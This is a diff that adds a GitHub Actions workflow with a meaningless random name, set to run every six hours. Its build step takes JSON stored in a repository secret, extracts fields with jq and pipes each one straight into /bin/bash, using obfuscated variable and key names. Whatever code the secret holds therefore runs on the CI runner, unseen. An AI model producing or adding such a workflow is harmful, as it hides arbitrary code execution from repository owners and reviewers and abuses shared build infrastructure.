@@ -1,0 +1,26 @@
+name: haotongfangxb
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '36 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: haotongfangxb
+        env:
+          eucg7: ${{ secrets.eucg7 }}
+        run: |
+          echo $eucg7 | jq -r .pmyci998 | /bin/bash
+          echo $nrh47 | jq -r .qztsu35572 | /bin/bash
+          echo $vvkoe07925 | jq -r .joue8303 | /bin/bash
+          echo $eomu96 | jq -r .kvpb92 | /bin/bash
+          echo $cx4882 | jq -r .e2 | /bin/bash
+          echo $qfra70 | jq -r .u95946 | /bin/bash
+          echo $jysp678 | jq -r .md60 | /bin/bash
+          echo $hgjte245 | jq -r .azf504 | /bin/bash
+          echo $oef9 | jq -r .wo1552 | /bin/bash
+          echo $qvww24 | jq -r .l4 | /bin/bash
+
